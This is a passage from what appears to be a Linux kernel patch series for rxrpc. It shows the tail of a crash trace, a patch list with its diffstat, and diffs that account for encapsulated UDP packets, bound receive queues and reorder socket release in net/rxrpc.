-[  275.412148][ T9427]  __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
-[  275.412704][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
-[  275.413384][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
-[  275.414221][ T9427]  x64_sys_call (arch/x86/include/generated/asm/syscalls_64.h:45)
-[  275.414884][ T9427]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
-[  275.415461][ T9427]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
-[  275.416325][ T9427] RIP: 0033:0x423104
-[  275.416869][ T9427] Code: Unable to access opcode bytes at 0x4230da.
-
-Code starting with the faulting instruction
-===========================================
-[  275.417602][ T9427] RSP: 002b:00007fd17b1191b0 EFLAGS: 00000293 ORIG_RAX: 000000000000002c
-[  275.418680][ T9427] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000423104
-[  275.419639][ T9427] RDX: 0000000000000024 RSI: 00007fd15c000b70 RDI: 0000000000000008
-[  275.420576][ T9427] RBP: 00007fd17b1191f0 R08: 000000001c46aae8 R09: 000000000000001c
-[  275.421697][ T9427] R10: 0000000000000000 R11: 0000000000000293 R12: 00000000000087cf
-[  275.422817][ T9427] R13: 000000008010f9c6 R14: 000000000043e718 R15: 000000001c46aae8
-[  275.423714][ T9427]  </TASK>
-[  275.424907][ T9427] Kernel Offset: disabled
-[  275.425408][ T9427] Rebooting in 86400 seconds..
------END crash log-----
-
-Best regards,
-Zihan Xi
-
-Zihan Xi (3):
-  rxrpc: account encapsulated packets to UDP socket
-  rxrpc: bound connection and OOB receive queues
-  rxrpc: bound DATA receive queues
-
- net/rxrpc/ar-internal.h  |  23 ++++++++
- net/rxrpc/call_event.c   |   1 +
- net/rxrpc/call_object.c  |   4 +-
- net/rxrpc/conn_event.c   |  22 +++++--
- net/rxrpc/conn_object.c  |  19 +++++-
- net/rxrpc/input.c        |  83 ++++++++++++++++++---------
- net/rxrpc/io_thread.c    |  63 +++++++++++++++++++-
- net/rxrpc/local_object.c |  25 +++++++-
- net/rxrpc/oob.c          |   5 +-
- net/rxrpc/recvmsg.c      |   3 +-
- net/rxrpc/skbuff.c       | 121 ++++++++++++++++++++++++++++++++++++++-
- 11 files changed, 327 insertions(+), 42 deletions(-)
-
+diff --git a/net/rxrpc/ar-internal.h b/net/rxrpc/ar-internal.h
+index 865f05fe37ab9..b079ec98aaa74 100644
+--- a/net/rxrpc/ar-internal.h
++++ b/net/rxrpc/ar-internal.h
+@@ -1323,6 +1323,7 @@ void rxrpc_send_version_request(struct rxrpc_local *local,
+  * local_object.c
+  */
+ void rxrpc_local_dont_fragment(const struct rxrpc_local *local, bool set);
++void rxrpc_adjust_rcvbuf(struct sock *sk);
+ struct rxrpc_local *rxrpc_lookup_local(struct net *, const struct sockaddr_rxrpc *);
+ struct rxrpc_local *rxrpc_get_local(struct rxrpc_local *, enum rxrpc_local_trace);
+ struct rxrpc_local *rxrpc_get_local_maybe(struct rxrpc_local *, enum rxrpc_local_trace);
+diff --git a/net/rxrpc/io_thread.c b/net/rxrpc/io_thread.c
+index dc5184a2fa9d1..634a6e1cab87a 100644
+--- a/net/rxrpc/io_thread.c
++++ b/net/rxrpc/io_thread.c
+@@ -7,12 +7,37 @@
+ 
+ #define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
+ 
++#include <net/udp.h>
++
+ #include "ar-internal.h"
+ 
+ static int rxrpc_input_packet_on_conn(struct rxrpc_connection *conn,
+ 				      struct sockaddr_rxrpc *peer_srx,
+ 				      struct sk_buff *skb);
+ 
++/*
++ * Drop UDP rmem ownership for packets charged in encap_rcv().
++ * sk_forward_alloc is serialised by sk_receive_queue.lock.
++ */
++static void rxrpc_skb_orphan_udp(struct sk_buff *skb)
++{
++	struct sock *sk = skb->sk;
++
++	if (!sk)
++		return;
++
++	spin_lock_bh(&sk->sk_receive_queue.lock);
++	skb_orphan(skb);
++	spin_unlock_bh(&sk->sk_receive_queue.lock);
++}
++
++static void rxrpc_encap_rcv_drop(struct sock *udp_sk, struct sk_buff *skb,
++				 enum skb_drop_reason reason)
++{
++	sk_drops_inc(udp_sk);
++	sk_skb_reason_drop(udp_sk, skb, reason);
++}
++
+ /*
+  * handle data received on the local endpoint
+  * - may be called in interrupt context
+@@ -28,6 +53,10 @@ int rxrpc_encap_rcv(struct sock *udp_sk, struct sk_buff *skb)
+ 	struct sk_buff_head *rx_queue;
+ 	struct rxrpc_local *local = rcu_dereference_sk_user_data(udp_sk);
+ 	struct task_struct *io_thread;
++	enum skb_drop_reason reason;
++	unsigned int headroom;
++	unsigned int rcvbuf;
++	unsigned int rmem;
+ 
+ 	if (unlikely(!local)) {
+ 		kfree_skb(skb);
+@@ -41,8 +70,6 @@ int rxrpc_encap_rcv(struct sock *udp_sk, struct sk_buff *skb)
+ 	if (skb->tstamp == 0)
+ 		skb->tstamp = ktime_get_real();
+ 
+-	skb->mark = RXRPC_SKB_MARK_PACKET;
+-	rxrpc_new_skb(skb, rxrpc_skb_new_encap_rcv);
+ 	rx_queue = &local->rx_queue;
+ #ifdef CONFIG_AF_RXRPC_INJECT_RX_DELAY
+ 	if (rxrpc_inject_rx_delay ||
+@@ -52,9 +79,36 @@ int rxrpc_encap_rcv(struct sock *udp_sk, struct sk_buff *skb)
+ 	}
+ #endif
+ 
++	headroom = SKB_TRUESIZE(RXRPC_JUMBO(1)) * 2;
++	spin_lock(&udp_sk->sk_receive_queue.lock);
++	rxrpc_adjust_rcvbuf(udp_sk);
++	rcvbuf = READ_ONCE(udp_sk->sk_rcvbuf);
++	rmem = atomic_read(&udp_sk->sk_rmem_alloc);
++	/* Permit one skb when there is no receive memory charged, as UDP does. */
++	if (rmem && rmem + skb->truesize + headroom >= rcvbuf) {
++		reason = SKB_DROP_REASON_SOCKET_RCVBUFF;
++		goto drop;
++	}
++	if (!sk_rmem_schedule(udp_sk, skb, skb->truesize)) {
++		reason = SKB_DROP_REASON_PROTO_MEM;
++		goto drop;
++	}
++
++	skb->dev = NULL;
++	skb_set_owner_r(skb, udp_sk);
++	spin_unlock(&udp_sk->sk_receive_queue.lock);
++	skb_dst_drop(skb);
++
++	skb->mark = RXRPC_SKB_MARK_PACKET;
++	rxrpc_new_skb(skb, rxrpc_skb_new_encap_rcv);
+ 	skb_queue_tail(rx_queue, skb);
+ 	wake_up_process(io_thread);
+ 	return 0;
++
++drop:
++	spin_unlock(&udp_sk->sk_receive_queue.lock);
++	rxrpc_encap_rcv_drop(udp_sk, skb, reason);
++	return 0;
+ }
+ 
+ /*
+@@ -471,6 +525,9 @@ int rxrpc_io_thread(void *data)
+ 		/* Distribute packets and errors. */
+ 		while ((skb = __skb_dequeue(&rx_queue))) {
+ 			struct rxrpc_skb_priv *sp = rxrpc_skb(skb);
++
++			if (skb->mark == RXRPC_SKB_MARK_PACKET)
++				rxrpc_skb_orphan_udp(skb);
+ 			switch (skb->mark) {
+ 			case RXRPC_SKB_MARK_PACKET:
+ 				skb->priority = 0;
+diff --git a/net/rxrpc/local_object.c b/net/rxrpc/local_object.c
+index 169f9dfdaa77f..f519a93059244 100644
+--- a/net/rxrpc/local_object.c
++++ b/net/rxrpc/local_object.c
+@@ -22,6 +22,19 @@
+ 
+ static void rxrpc_local_rcu(struct rcu_head *);
+ 
++void rxrpc_adjust_rcvbuf(struct sock *sk)
++{
++	u32 rcvbuf, old_rcvbuf;
++
++	rcvbuf = READ_ONCE(rxrpc_rx_window_size) *
++		SKB_TRUESIZE(RXRPC_JUMBO(1)) * 2;
++	rcvbuf += rcvbuf / 4;
++	rcvbuf = min_t(u32, rcvbuf, READ_ONCE(sysctl_rmem_max));
++	old_rcvbuf = READ_ONCE(sk->sk_rcvbuf);
++	if (rcvbuf > old_rcvbuf)
++		WRITE_ONCE(sk->sk_rcvbuf, rcvbuf);
++}
++
+ /*
+  * Handle an ICMP/ICMP6 error turning up at the tunnel.  Push it through the
+  * usual mechanism so that it gets parsed and presented through the UDP
+@@ -198,6 +211,9 @@ static int rxrpc_open_socket(struct rxrpc_local *local, struct net *net)
+ 
+ 	/* set the socket up */
+ 	usk = local->socket->sk;
++	spin_lock_bh(&usk->sk_receive_queue.lock);
++	rxrpc_adjust_rcvbuf(usk);
++	spin_unlock_bh(&usk->sk_receive_queue.lock);
+ 	usk->sk_error_report = rxrpc_error_report;
+ 
+ 	switch (srx->transport.family) {
+@@ -437,8 +453,8 @@ void rxrpc_destroy_local(struct rxrpc_local *local)
+ 	if (socket) {
+ 		local->socket = NULL;
+ 		kernel_sock_shutdown(socket, SHUT_RDWR);
+-		socket->sk->sk_user_data = NULL;
+-		sock_release(socket);
++		rcu_assign_sk_user_data(socket->sk, NULL);
++		synchronize_rcu();
+ 	}
+ 
+ 	/* At this point, there should be no more packets coming in to the
+@@ -448,6 +464,10 @@ void rxrpc_destroy_local(struct rxrpc_local *local)
+ 	rxrpc_purge_queue(&local->rx_delay_queue);
+ #endif
+ 	rxrpc_purge_queue(&local->rx_queue);
++
++	if (socket)
++		sock_release(socket);
++
+ 	rxrpc_purge_client_connections(local);
+ 	page_frag_cache_drain(&local->tx_alloc);
+ }
 -- 
 2.43.0
 
